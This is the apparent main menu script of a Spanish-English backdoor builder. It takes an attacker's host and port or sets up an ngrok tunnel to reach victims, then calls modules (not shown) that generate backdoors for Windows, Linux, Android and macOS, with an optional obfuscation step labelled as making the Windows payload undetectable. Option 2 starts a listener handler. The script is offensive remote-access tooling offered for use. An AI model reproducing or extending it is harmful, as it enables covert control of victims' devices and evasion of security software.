 #By EmmanuelCruzL 
# -*- coding: utf-8 -*-

import os 
import sys
from time import sleep
sys.path.append('models/')
from payload import Payload
from ngrok_server import tunnel
from logos import Logo
from time import sleep
from handler import main
def cleaning(name):
    os.system("clear")
    os.system("figlet {}".format(name ))

logo = Logo()


while True:
    os.system("clear")    
    logo.printTerms()
    vpn = tunnel()
    choice = input("Enter your choice #~:  ")
    if choice =="1":
                logo.printVpn()
                opt = input("Enter your choice #~:  ")
                if opt =="1":
                    cleaning("CONFIG BACKDOOR")
                    payload = Payload(input("LHOST: "),input("LPORT: "))
                else:
                    logo.printConfigVpn()
                    vpn.port = input("PORT: ")
                    configuration = vpn.create_tunnel()
                    print("configurando vpn...")
                    print(configuration)
                    payload = Payload(configuration[1].replace("/",""),configuration[2])
                    sleep(3)
                os.system("clear")
                logo.printBackdoorMaker()

                opt = int(input("Which Backdoor You want to generate? #~: "))

                if  opt==1:
                    obs =input("Desea Ofuscar el backdoor(indectectable) (S/N)#~: ")
                    obs = True if obs.upper() =="S" else False  
                    payload.createBackdoorWindows(obs)           
                elif opt == 2:
                    payload.createBackdoorLinux()

                elif opt == 3:
                    payload.createBackdoorAndroid()
                elif opt == 4:
                    payload.createBackdoorMacOs()
                elif opt == 5:
                    payload.createBackdoorMacOs()
                else:
                    cleaning("BYE FRIEND #)")


    elif choice == "2":
            main()
    elif choice == "3":
            cleaning("BYE FRIEND #)")
            break
    else:
            print("OPCION INCORRCTA....")
            sleep(1)
